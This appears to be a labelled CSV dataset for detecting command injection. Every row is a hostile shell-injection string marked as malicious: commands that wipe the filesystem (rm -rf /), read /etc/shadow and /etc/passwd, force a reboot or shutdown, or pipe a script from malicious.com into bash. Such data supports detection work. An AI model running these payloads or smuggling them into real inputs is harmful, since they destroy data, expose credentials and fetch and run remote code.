request_data,label
&& reboot,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
; rm -rf /,1
&& shutdown now,1
&& reboot,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
; rm -rf /,1
; cat /etc/shadow,1
; rm -rf /,1
&& shutdown now,1
; ls -la /etc/passwd,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
; ls -la /etc/passwd,1
&& shutdown now,1
; rm -rf /,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
; cat /etc/shadow,1
&& reboot,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
&& reboot,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
&& shutdown now,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
&& reboot,1
; rm -rf /,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
| wget http://malicious.com/shell.sh | bash,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
| wget http://malicious.com/shell.sh | bash,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
; rm -rf /,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
; rm -rf /,1
&& reboot,1
&& reboot,1
; rm -rf /,1
&& reboot,1
&& reboot,1
; ls -la /etc/passwd,1
&& reboot,1
&& shutdown now,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
; rm -rf /,1
&& shutdown now,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
; rm -rf /,1
&& shutdown now,1
; ls -la /etc/passwd,1
; rm -rf /,1
; rm -rf /,1
; ls -la /etc/passwd,1
&& reboot,1
; ls -la /etc/passwd,1
; rm -rf /,1
&& reboot,1
; rm -rf /,1
&& reboot,1
&& reboot,1
; cat /etc/shadow,1
&& reboot,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
&& shutdown now,1
; ls -la /etc/passwd,1
; rm -rf /,1
; rm -rf /,1
&& shutdown now,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
; ls -la /etc/passwd,1
&& reboot,1
; ls -la /etc/passwd,1
; rm -rf /,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
; rm -rf /,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
; ls -la /etc/passwd,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
; rm -rf /,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
; rm -rf /,1
| wget http://malicious.com/shell.sh | bash,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
&& shutdown now,1
; ls -la /etc/passwd,1
&& reboot,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
&& reboot,1
&& reboot,1
; rm -rf /,1
&& shutdown now,1
; cat /etc/shadow,1
; cat /etc/shadow,1
; cat /etc/shadow,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
&& shutdown now,1
; cat /etc/shadow,1
&& shutdown now,1
&& shutdown now,1
; ls -la /etc/passwd,1
&& shutdown now,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
; ls -la /etc/passwd,1
&& shutdown now,1
&& reboot,1
; cat /etc/shadow,1
&& shutdown now,1
; rm -rf /,1
; rm -rf /,1
; rm -rf /,1
; cat /etc/shadow,1
; rm -rf /,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
; cat /etc/shadow,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
; ls -la /etc/passwd,1
; rm -rf /,1
&& shutdown now,1
; ls -la /etc/passwd,1
&& shutdown now,1
&& shutdown now,1
; rm -rf /,1
; rm -rf /,1
&& shutdown now,1
; ls -la /etc/passwd,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
; rm -rf /,1
; ls -la /etc/passwd,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
; rm -rf /,1
&& shutdown now,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
&& shutdown now,1
; ls -la /etc/passwd,1
&& shutdown now,1
; rm -rf /,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
; rm -rf /,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
; cat /etc/shadow,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
; cat /etc/shadow,1
&& shutdown now,1
&& reboot,1
&& shutdown now,1
; cat /etc/shadow,1
; rm -rf /,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
; rm -rf /,1
; ls -la /etc/passwd,1
; rm -rf /,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
&& shutdown now,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
; ls -la /etc/passwd,1
; rm -rf /,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
&& shutdown now,1
; cat /etc/shadow,1
&& shutdown now,1
; cat /etc/shadow,1
&& shutdown now,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
; ls -la /etc/passwd,1
&& shutdown now,1
&& reboot,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
&& shutdown now,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
&& shutdown now,1
&& reboot,1
&& reboot,1
; ls -la /etc/passwd,1
; rm -rf /,1
&& shutdown now,1
&& reboot,1
&& reboot,1
&& reboot,1
&& reboot,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
&& reboot,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
&& reboot,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
&& reboot,1
&& reboot,1
; cat /etc/shadow,1
&& reboot,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
&& reboot,1
; rm -rf /,1
; ls -la /etc/passwd,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
&& reboot,1
; cat /etc/shadow,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
; cat /etc/shadow,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
&& reboot,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
| wget http://malicious.com/shell.sh | bash,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
; cat /etc/shadow,1
&& shutdown now,1
; rm -rf /,1
; ls -la /etc/passwd,1
; rm -rf /,1
&& shutdown now,1
; ls -la /etc/passwd,1
; rm -rf /,1
; ls -la /etc/passwd,1
; rm -rf /,1
&& reboot,1
&& shutdown now,1
; cat /etc/shadow,1
&& reboot,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
&& shutdown now,1
&& reboot,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
&& shutdown now,1
; rm -rf /,1
; rm -rf /,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
; ls -la /etc/passwd,1
&& reboot,1
&& shutdown now,1
; cat /etc/shadow,1
&& reboot,1
; ls -la /etc/passwd,1
&& reboot,1
; cat /etc/shadow,1
&& shutdown now,1
&& reboot,1
; rm -rf /,1
; rm -rf /,1
; rm -rf /,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
&& reboot,1
; rm -rf /,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
&& shutdown now,1
; ls -la /etc/passwd,1
; rm -rf /,1
&& reboot,1
&& reboot,1
; cat /etc/shadow,1
; cat /etc/shadow,1
&& reboot,1
&& reboot,1
; ls -la /etc/passwd,1
&& reboot,1
; ls -la /etc/passwd,1
&& reboot,1
; rm -rf /,1
&& reboot,1
; rm -rf /,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
&& reboot,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
; ls -la /etc/passwd,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
&& reboot,1
&& reboot,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
&& reboot,1
&& shutdown now,1
&& reboot,1
&& shutdown now,1
; cat /etc/shadow,1
&& shutdown now,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
&& reboot,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
&& reboot,1
&& reboot,1
; rm -rf /,1
; rm -rf /,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
; ls -la /etc/passwd,1
; ls -la /etc/passwd,1
&& reboot,1
&& reboot,1
; rm -rf /,1
; rm -rf /,1
; rm -rf /,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
&& shutdown now,1
; rm -rf /,1
| wget http://malicious.com/shell.sh | bash,1
| wget http://malicious.com/shell.sh | bash,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
; ls -la /etc/passwd,1
&& reboot,1
&& reboot,1
&& reboot,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
; cat /etc/shadow,1
; rm -rf /,1
; cat /etc/shadow,1
; rm -rf /,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
; rm -rf /,1
&& shutdown now,1
; rm -rf /,1
&& reboot,1
; rm -rf /,1
&& reboot,1
&& reboot,1
; ls -la /etc/passwd,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
&& shutdown now,1
; cat /etc/shadow,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
&& reboot,1
; rm -rf /,1
; cat /etc/shadow,1
; cat /etc/shadow,1
; cat /etc/shadow,1
&& reboot,1
&& reboot,1
&& shutdown now,1
; ls -la /etc/passwd,1
&& shutdown now,1
; rm -rf /,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
&& shutdown now,1
&& reboot,1
&& reboot,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
; cat /etc/shadow,1
&& reboot,1
; rm -rf /,1
; ls -la /etc/passwd,1
&& shutdown now,1
; rm -rf /,1
; rm -rf /,1
&& shutdown now,1
; cat /etc/shadow,1
; rm -rf /,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
&& reboot,1
&& shutdown now,1
&& shutdown now,1
&& shutdown now,1
&& shutdown now,1
; rm -rf /,1
&& reboot,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
; ls -la /etc/passwd,1
&& reboot,1
; rm -rf /,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
&& reboot,1
&& reboot,1
; ls -la /etc/passwd,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
; rm -rf /,1
; rm -rf /,1
; cat /etc/shadow,1
; cat /etc/shadow,1
&& shutdown now,1
; rm -rf /,1
&& reboot,1
; cat /etc/shadow,1
; rm -rf /,1
&& shutdown now,1
&& shutdown now,1
; cat /etc/shadow,1
; rm -rf /,1
&& shutdown now,1
; cat /etc/shadow,1
&& reboot,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
; rm -rf /,1
; cat /etc/shadow,1
; rm -rf /,1
&& shutdown now,1
&& shutdown now,1
; cat /etc/shadow,1
; cat /etc/shadow,1
&& shutdown now,1
&& reboot,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
; rm -rf /,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
; cat /etc/shadow,1
&& reboot,1
; ls -la /etc/passwd,1
; ls -la /etc/passwd,1
&& shutdown now,1
&& shutdown now,1
; rm -rf /,1
&& reboot,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
&& shutdown now,1
; ls -la /etc/passwd,1
; rm -rf /,1
; rm -rf /,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
; ls -la /etc/passwd,1
; ls -la /etc/passwd,1
&& shutdown now,1
&& shutdown now,1
; ls -la /etc/passwd,1
; rm -rf /,1
&& shutdown now,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
; rm -rf /,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
&& reboot,1
; ls -la /etc/passwd,1
&& shutdown now,1
&& reboot,1
; ls -la /etc/passwd,1
&& shutdown now,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
; ls -la /etc/passwd,1
; ls -la /etc/passwd,1
; rm -rf /,1
; rm -rf /,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
; ls -la /etc/passwd,1
; rm -rf /,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
; cat /etc/shadow,1
&& shutdown now,1
&& shutdown now,1
&& reboot,1
; ls -la /etc/passwd,1
&& reboot,1
; ls -la /etc/passwd,1
; rm -rf /,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
&& shutdown now,1
; cat /etc/shadow,1
&& shutdown now,1
&& reboot,1
; ls -la /etc/passwd,1
; rm -rf /,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
&& reboot,1
&& shutdown now,1
; rm -rf /,1
; rm -rf /,1
; rm -rf /,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
&& reboot,1
; rm -rf /,1
&& shutdown now,1
&& shutdown now,1
&& reboot,1
; cat /etc/shadow,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
&& reboot,1
; rm -rf /,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
&& reboot,1
&& reboot,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
&& shutdown now,1
&& shutdown now,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
; rm -rf /,1
&& shutdown now,1
; cat /etc/shadow,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
; rm -rf /,1
&& shutdown now,1
&& reboot,1
; cat /etc/shadow,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
; rm -rf /,1
&& reboot,1
; rm -rf /,1
; cat /etc/shadow,1
&& shutdown now,1
&& shutdown now,1
; cat /etc/shadow,1
; rm -rf /,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
; ls -la /etc/passwd,1
&& reboot,1
&& shutdown now,1
; rm -rf /,1
&& shutdown now,1
; ls -la /etc/passwd,1
; ls -la /etc/passwd,1
; ls -la /etc/passwd,1
; rm -rf /,1
&& shutdown now,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
; rm -rf /,1
; cat /etc/shadow,1
; rm -rf /,1
; ls -la /etc/passwd,1
&& reboot,1
; cat /etc/shadow,1
&& shutdown now,1
&& reboot,1
&& reboot,1
; cat /etc/shadow,1
; cat /etc/shadow,1
&& reboot,1
; cat /etc/shadow,1
; rm -rf /,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
; rm -rf /,1
| wget http://malicious.com/shell.sh | bash,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
; rm -rf /,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
&& reboot,1
; ls -la /etc/passwd,1
&& shutdown now,1
&& shutdown now,1
; cat /etc/shadow,1
&& shutdown now,1
; rm -rf /,1
&& reboot,1
&& reboot,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
; rm -rf /,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
&& shutdown now,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
&& shutdown now,1
; rm -rf /,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
; rm -rf /,1
; ls -la /etc/passwd,1
&& shutdown now,1
; cat /etc/shadow,1
&& reboot,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
; cat /etc/shadow,1
&& reboot,1
; rm -rf /,1
; cat /etc/shadow,1
; rm -rf /,1
&& reboot,1
&& reboot,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
; rm -rf /,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
; cat /etc/shadow,1
&& reboot,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
&& shutdown now,1
&& reboot,1
&& shutdown now,1
; cat /etc/shadow,1
&& reboot,1
&& reboot,1
; cat /etc/shadow,1
; rm -rf /,1
; ls -la /etc/passwd,1
; ls -la /etc/passwd,1
; rm -rf /,1
&& shutdown now,1
; rm -rf /,1
&& reboot,1
&& shutdown now,1
&& shutdown now,1
; cat /etc/shadow,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
&& reboot,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
&& reboot,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
; rm -rf /,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
; rm -rf /,1
&& shutdown now,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
; ls -la /etc/passwd,1
&& shutdown now,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
&& shutdown now,1
&& reboot,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
&& reboot,1
&& shutdown now,1
; rm -rf /,1
&& shutdown now,1
; rm -rf /,1
; cat /etc/shadow,1
&& reboot,1
; ls -la /etc/passwd,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
&& reboot,1
&& reboot,1
; rm -rf /,1
; cat /etc/shadow,1
; rm -rf /,1
&& reboot,1
; rm -rf /,1
&& reboot,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
&& reboot,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
&& shutdown now,1
; cat /etc/shadow,1
&& shutdown now,1
; ls -la /etc/passwd,1
; ls -la /etc/passwd,1
; ls -la /etc/passwd,1
&& reboot,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
&& reboot,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
; rm -rf /,1
; rm -rf /,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
; rm -rf /,1
&& reboot,1
&& reboot,1
&& reboot,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
; ls -la /etc/passwd,1
&& reboot,1
; ls -la /etc/passwd,1
&& reboot,1
&& reboot,1
&& reboot,1
&& shutdown now,1
; rm -rf /,1
; ls -la /etc/passwd,1
; ls -la /etc/passwd,1
; rm -rf /,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
&& reboot,1
; rm -rf /,1
; ls -la /etc/passwd,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
&& shutdown now,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
; rm -rf /,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
; rm -rf /,1
; ls -la /etc/passwd,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
&& shutdown now,1
; rm -rf /,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
; rm -rf /,1
| wget http://malicious.com/shell.sh | bash,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
&& reboot,1
; ls -la /etc/passwd,1
; rm -rf /,1
; cat /etc/shadow,1
&& shutdown now,1
&& shutdown now,1
&& shutdown now,1
&& shutdown now,1
; ls -la /etc/passwd,1
&& reboot,1
; cat /etc/shadow,1
&& reboot,1
; ls -la /etc/passwd,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
| wget http://malicious.com/shell.sh | bash,1
&& shutdown now,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
; rm -rf /,1
; ls -la /etc/passwd,1
&& reboot,1
| wget http://malicious.com/shell.sh | bash,1
; rm -rf /,1
; rm -rf /,1
; cat /etc/shadow,1
; cat /etc/shadow,1
&& shutdown now,1
; ls -la /etc/passwd,1
; ls -la /etc/passwd,1
; rm -rf /,1
| wget http://malicious.com/shell.sh | bash,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
; ls -la /etc/passwd,1
&& shutdown now,1
; cat /etc/shadow,1
| wget http://malicious.com/shell.sh | bash,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
&& reboot,1
&& reboot,1
; cat /etc/shadow,1
&& reboot,1
; ls -la /etc/passwd,1
; ls -la /etc/passwd,1
&& shutdown now,1
&& shutdown now,1
| wget http://malicious.com/shell.sh | bash,1
&& reboot,1
&& reboot,1
; ls -la /etc/passwd,1
| wget http://malicious.com/shell.sh | bash,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
; cat /etc/shadow,1
&& reboot,1
&& reboot,1
&& reboot,1
; rm -rf /,1
| wget http://malicious.com/shell.sh | bash,1
; cat /etc/shadow,1
&& shutdown now,1
; rm -rf /,1
&& shutdown now,1
; ls -la /etc/passwd,1
&& shutdown now,1
; cat /etc/shadow,1
; ls -la /etc/passwd,1
